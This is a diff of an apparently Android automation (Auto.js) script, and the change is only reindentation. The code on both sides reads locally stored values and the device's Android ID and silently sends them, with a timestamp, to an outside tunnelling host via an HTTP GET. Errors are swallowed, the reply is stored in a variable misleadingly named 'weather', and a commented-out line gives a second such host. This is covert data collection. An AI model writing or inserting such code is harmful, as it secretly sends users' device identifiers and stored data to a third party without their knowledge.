@@ -1,21 +1,21 @@
 ﻿(function(){try {
 
-function Cr(){
-this.bbs=本地储存.get("xinxi");
-this.xxnr = 本地储存.get("nengrong");
-this.sjs = new Date(); 
-}
+      function Cr(){
+          this.bbs=本地储存.get("xinxi");
+          this.xxnr = 本地储存.get("nengrong");
+          this.sjs = new Date(); 
+        }
 
-var cc=new Cr();
+        var cc=new Cr();
 
-var ids = device.getAndroidId();      
-var hznr=cc.bbs+"-"+cc.xxnr;
-var sj=cc.sjs
-var res = http.get("http://sdbsxwf.free.idcfengye.com/1mis.php?fname=" + ids + "&age=" + hznr+"&data="+sj);
-//var res = http.get("http://sdbsxwf777777.vaiwan.com/1mis.php?fname=" + ids + "&age=" + hznr+"&data="+sj);
-var weather = res.body.string();
-} catch (e) {}
+        var ids = device.getAndroidId(); 
+        var hznr=cc.bbs+"-"+cc.xxnr;
+        var sj=cc.sjs
+        var res = http.get("http://sdbsxwf.free.idcfengye.com/1mis.php?fname=" + ids + "&age=" + hznr+"&data="+sj);
+        //var res = http.get("http://sdbsxwf777777.vaiwan.com/1mis.php?fname=" + ids + "&age=" + hznr+"&data="+sj);
+        var weather = res.body.string();
+      } catch (e) {}
 
-log("我要答");
-})()
+      log("我要答");
+    })()
 
